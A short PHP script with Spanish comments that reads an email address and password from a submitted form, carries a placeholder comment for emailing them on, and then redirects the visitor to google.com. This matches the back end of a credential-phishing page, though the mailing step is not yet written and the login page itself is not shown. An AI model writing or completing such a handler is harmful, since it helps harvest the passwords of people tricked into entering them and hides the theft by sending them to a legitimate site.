<?php
// Verificamos primero si llegó la información por el formulario
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Recibimos los datos de forma segura para evitar errores
    $email = isset($_POST["email"]) ? trim($_POST["email"]) : "";
    $password = isset($_POST["password"]) ? trim($_POST["password"]) : "";

    // --- Aquí iría el código para enviar el correo si lo querés después ---
    // Por ahora solo lo dejamos funcionando para redirigir

    // Redirigir a Google
    header("Location: https://www.google.com");
    exit; // Detenemos la ejecución para que no siga corriendo nada más

} else {
    // Si alguien entra directamente a procesar.php, lo devolvemos al formulario
    header("Location: index.html");
    exit;
}
?>
